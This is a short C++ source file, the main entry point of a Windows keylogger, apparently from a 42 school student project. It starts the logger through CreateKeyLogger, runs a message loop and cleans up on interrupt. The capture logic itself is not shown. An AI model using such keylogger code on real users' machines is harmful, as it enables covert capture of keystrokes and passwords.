/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   winkey.cpp                                         :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ecaceres <ecaceres@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/01/09 00:56:05 by ecaceres          #+#    #+#             */
/*   Updated: 2023/01/09 00:56:05 by ecaceres         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "winkey.hpp"

int main(void)
{
	TCHAR workingDirectory[MAX_PATH] = { 0 };
	GetCurrentDirectory(MAX_PATH, workingDirectory);
	std::cout << "Working directory: " << workingDirectory << std::endl;

	signal(SIGINT, &HandleSignal);

	if (CreateKeyLogger() != EXIT_SUCCESS)
	{
		Cleanup();
		return (EXIT_FAILURE);
	}

	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	Cleanup();
	return (EXIT_SUCCESS);
}

void Cleanup()
{
	DestroyKeyLogger();
}

void HandleSignal(int sig)
{
	std::cout << "HandleSignal" << std::endl;
	Cleanup();
	exit(sig);
}
